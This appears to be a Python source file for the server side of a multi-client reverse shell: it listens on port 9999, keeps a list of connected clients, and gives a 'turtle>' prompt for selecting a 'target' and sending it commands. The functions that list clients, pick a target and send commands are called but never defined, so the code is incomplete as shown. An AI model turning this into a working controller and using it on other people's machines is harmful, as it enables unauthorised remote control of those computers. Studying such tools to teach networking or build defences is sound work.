import queue
import socket
import sys
from queue import Queue
import threading

no_of_threads = 2
job_number = [1,2]
queue = Queue()
all_connections = []
all_addresses = []


host = ""
port = 9999
global s

#function for creating a socket 
def create_socket():
    global s
    try:
        s = socket.socket()
    except:
        print("Error: " + str(socket.error))

#function for binding the socket and port & host address / listening to connection
def bind_socket():
    global s
    try:
        print("Binding the port {} and the host {} with the socket".format(str(port),host))
        s.bind((host,port))
        s.listen(5)
    except:
        print("Error: " + str(socket.error) + "\n" + "Tryng again to bind!")
        bind_socket()



#handling connections from multiple clients and saving to a list  (socket must be listening )
# closing previous connections when server.py file is restarted

def accepting_connection():
    for connection in all_connections:
        connection.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            connection,address = s.accept()
            s.setblocking(1) # prevents timeout
            all_connections.append(connection)
            all_addresses.append(address)
            print("Connection has been established | IP: {} | Port {}".format(address[0], str(address[1])))
        except:
            print("Error: " + str(socket.error))

# 2nd thread functions 1-) see all clients 2-) select a client 3-) send command to the client 

def start_turtle():
    cmd = input("turtle> ")
    if cmd == 'list':
        list_connection()
    elif 'select' in cmd:
        conn = get_target()
        if conn is not None:
            send_target_commands(cmd)
    else:
        print("Command not found")
